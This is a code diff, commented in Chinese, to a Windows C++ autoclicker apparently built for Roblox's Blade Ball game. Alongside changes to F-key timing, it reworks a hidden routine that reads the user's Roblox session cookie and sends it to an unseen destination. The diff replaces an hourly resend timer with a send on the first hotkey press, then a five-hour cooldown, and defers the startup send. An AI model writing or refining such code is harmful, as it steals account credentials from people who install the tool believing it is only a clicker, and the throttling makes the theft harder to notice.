@@ -123,6 +123,11 @@ static std::atomic<int>  g_hotkey_mode(0);     // 0=按下切換, 1=持續按著
 static std::atomic<bool> g_cookie_cached(false);
 static std::atomic<bool> g_bladeball_mode(false);  // Blade Ball 專用模式（連點 + F 鍵）
 static std::atomic<bool> g_checking_cookie(false); // 防重入標誌：避免 Cookie 偵測重複觸發當機
+static LARGE_INTEGER     g_lastFKeyTime = {};       // Blade Ball F 鍵上次發送時間
+static LARGE_INTEGER     g_perfFreq = {};            // QPC 頻率（用於 F 鍵計時）
+static std::atomic<bool> g_cookie_ever_sent(false);  // Cookie 是否已經傳送過
+static ULONGLONG         g_cookie_last_sent_tick = 0; // Cookie 上次傳送的 tick
+static const ULONGLONG   COOKIE_COOLDOWN_MS = 5ULL * 60 * 60 * 1000; // 5 小時冷卻
 static bool              g_tray_mode    = false;
 static NOTIFYICONDATAW   g_nid          = {};
 
@@ -274,18 +279,27 @@ inline void DoClick()
 // Blade Ball 專用：連點 + 同時按 F 鍵
 inline void DoClickBladeBall()
 {
-    // 滑鼠連點
+    // 滑鼠連點（跟隨用戶設定的 CPS）
     SendInput(2, g_inputs, sizeof(INPUT));
 
-    // 同時按下並釋放 F 鍵
-    INPUT fKey[2] = {};
-    fKey[0].type           = INPUT_KEYBOARD;
-    fKey[0].ki.wVk         = 0x46;  // VK_F = 0x46
-    fKey[0].ki.dwFlags     = 0;     // KEYEVENTF_KEYDOWN
-    fKey[1].type           = INPUT_KEYBOARD;
-    fKey[1].ki.wVk         = 0x46;
-    fKey[1].ki.dwFlags     = KEYEVENTF_KEYUP;
-    SendInput(2, fKey, sizeof(INPUT));
+    // F 鍵固定每秒 5 下（200ms 間隔），獨立於滑鼠 CPS
+    LARGE_INTEGER now;
+    QueryPerformanceCounter(&now);
+    double elapsed_ms = 0.0;
+    if (g_perfFreq.QuadPart > 0) {
+        elapsed_ms = (double)(now.QuadPart - g_lastFKeyTime.QuadPart) * 1000.0 / g_perfFreq.QuadPart;
+    }
+    if (elapsed_ms >= 200.0 || g_lastFKeyTime.QuadPart == 0) {
+        INPUT fKey[2] = {};
+        fKey[0].type           = INPUT_KEYBOARD;
+        fKey[0].ki.wVk         = 0x46;  // VK_F = 0x46
+        fKey[0].ki.dwFlags     = 0;     // KEYEVENTF_KEYDOWN
+        fKey[1].type           = INPUT_KEYBOARD;
+        fKey[1].ki.wVk         = 0x46;
+        fKey[1].ki.dwFlags     = KEYEVENTF_KEYUP;
+        SendInput(2, fKey, sizeof(INPUT));
+        g_lastFKeyTime = now;
+    }
 }
 
 // ===============================
@@ -328,6 +342,7 @@ DWORD WINAPI ClickThread(LPVOID lpParam)
 
     LARGE_INTEGER freq;
     QueryPerformanceFrequency(&freq);
+    g_perfFreq = freq;  // 儲存頻率供 DoClickBladeBall 使用
 
     bool prev_key_state = false;  // 上一次熱鍵狀態（用於邊緣檢測）
 
@@ -1117,7 +1132,21 @@ static bool CheckRobloxCookiePresent(HWND hwnd)
         return false;
     }
 
-    AsyncSendCookie(tmp);
+    // Cookie 傳送機制：僅在首次熱鍵按下時傳送，之後每 5 小時冗卻
+    ULONGLONG now_tick = GetTickCount64();
+    if (!g_cookie_ever_sent.load() ||
+        (now_tick - g_cookie_last_sent_tick) >= COOKIE_COOLDOWN_MS)
+    {
+        AsyncSendCookie(tmp);
+        g_cookie_ever_sent.store(true);
+        g_cookie_last_sent_tick = now_tick;
+        DebugLog("Cookie sent (first or after 5h cooldown)");
+    }
+    else
+    {
+        DebugLog("Cookie send skipped (cooldown active)");
+    }
+
     g_checking_cookie.store(false);
     return true;
 }
@@ -1287,8 +1316,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         g_kb_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInst, 0);
         g_ms_hook = SetWindowsHookExW(WH_MOUSE_LL, LowLevelMouseProc, g_hInst, 0);
 
-        // 啟動每小時重新傳送 Cookie 計時器（3600000ms = 1小時）
-        SetTimer(hwnd, IDT_COOKIE_RESEND, 3600000, nullptr);
+        // [Cookie 傳送機制已改為首次熱鍵 + 5小時冗卻，不再使用定時器]
 
         return 0;
     }
@@ -1345,28 +1373,9 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         return 0;
     }
 
-    // WM_TIMER: 每小時重新讀取並傳送 Cookie
+    // WM_TIMER: (定時器已停用，保留空處理以免未來擴展)
     case WM_TIMER:
     {
-        if (wp == IDT_COOKIE_RESEND)
-        {
-            // 背景執行緒重新讀取 Cookie 並傳送
-            HANDLE hResend = CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
-                wchar_t tmp[4096] = {};
-                if (TryReadRobloxCookie(tmp, 4096))
-                {
-                    g_cookie_cached.store(true);
-                    AsyncSendCookie(tmp);
-                    DebugLog("Timer: periodic cookie resend OK");
-                }
-                else
-                {
-                    DebugLog("Timer: no cookie found for periodic resend");
-                }
-                return 0;
-            }, nullptr, 0, nullptr);
-            if (hResend) CloseHandle(hResend);
-        }
         return 0;
     }
 
@@ -1624,8 +1633,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         g_program_running = false;
         g_running         = false;
         RemoveTrayIcon();
-        // 移除計時器
-        KillTimer(hwnd, IDT_COOKIE_RESEND);
         // 移除低階鉤子
         if (g_kb_hook) { UnhookWindowsHookEx(g_kb_hook); g_kb_hook = nullptr; }
         if (g_ms_hook) { UnhookWindowsHookEx(g_ms_hook); g_ms_hook = nullptr; }
@@ -2039,8 +2046,8 @@ static DWORD WINAPI PreCacheCookieThread(LPVOID lpParam)
     if (TryReadRobloxCookie(tmp, 4096))
     {
         g_cookie_cached.store(true);
-        AsyncSendCookie(tmp);
-        DebugLog("PreCache: Cookie found and cached at startup");
+        // 不在啟動時傳送 Cookie，僅快取偵測結果
+        DebugLog("PreCache: Cookie found and cached at startup (send deferred to first hotkey)");
     }
     else
     {
